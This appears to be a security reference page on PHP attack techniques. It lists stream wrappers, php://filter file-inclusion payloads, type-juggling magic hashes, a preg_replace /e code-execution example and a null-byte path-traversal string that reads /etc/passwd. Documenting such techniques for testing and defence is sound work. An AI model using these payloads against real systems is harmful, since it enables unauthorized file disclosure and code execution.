---
title : "PHP"
description: "Overview of the PHP programming language"
lead: "Overview of the PHP programming language"
date: 2020-10-06T08:48:23+00:00
lastmod: 2020-10-06T08:48:23+00:00
draft: false
images: []
---

## PHP

[PHP](https://www.php.net/) is a popular general-purpose scripting language that is especially suited to web development.

## PHP Wrappers

**[Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php):**

```
file:// — Accessing local filesystem
http:// — Accessing HTTP(s) URLs
ftp:// — Accessing FTP(s) URLs
php:// — Accessing various I/O streams
php://input — Parse HTTP requests (like $_POST or $_PUT body)
zlib:// — Compression Streams
data:// — Data (RFC 2397)
glob:// — Find pathnames matching pattern
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — Process Interaction Streams
```

**File inclusion:**

```
php://filter/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://filter/read=string.toupper|string.rot13/resource=index.php
```

- [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator): RCE without uploading a file if you control the parameter passed to a `require`/`include`.

## Type juggling

**[PHP type comparison tables](https://www.php.net/manual/en/types.comparisons.php):**

- `==`: Comparison
- `===`: Strict comparison (no casting)

```php
"1" == 1      # True
"1" === 1     # False
"0e123" == 0  # True
"0e123" === 0 # False
```

- List of [magic hashes](https://github.com/spaze/hashes).

## Dangerous functions

- **eval**
- **preg_replace**: Code execution before PHP 7.0.0 with `preg_replace('/test/e', 'phpinfo()', 'test');`
- **assert**: Code execution inside `assert` string

## Null byte

Works in `PHP < 5.3.4`:

- `index.php?file=../etc/passwd%00`

## Introspection

- **call_user_func()**: Calls a callback function with the given arguments.
- **call_user_func_array()**: Calls a callback function with an array of parameters.
- **func_get_args()**: Returns an array of the arguments passed to the function.
- **func_get_arg()**: Returns the argument value for a specific position in the list of arguments.
- **func_num_args()**: Returns the number of arguments passed to the function.
- **class_exists()**: Checks if a class has been defined.
- **function_exists()**: Checks if a function has been defined.
- **method_exists()**: Checks if a method exists in a class or object.
- **property_exists()**: Checks if a property exists in a class or object.
- **interface_exists()**: Checks if an interface has been defined.
- **get_class()**: Returns the name of the class of an object.
- **get_class_methods()**: Returns an array of the names of the methods from the given class.
- **get_class_vars()**: Returns an associative array of declared properties for a given class.
- **get_declared_classes()**: Returns an array of all declared classes.
- **get_declared_interfaces()**: Returns an array of all declared interfaces.
- **get_declared_traits()**: Returns an array of all declared traits.
- **get_defined_functions()**: Returns a multidimensional array containing a list of all defined functions.
- **get_defined_vars()**: Returns an array of all defined variables.
- **get_parent_class()**: Retrieves the parent class name for object or class.
- **is_a()**: Checks if the object is of this class or has this class as one of its parents.
- **is_subclass_of()**: Checks if the given object has the class as one of its parents.
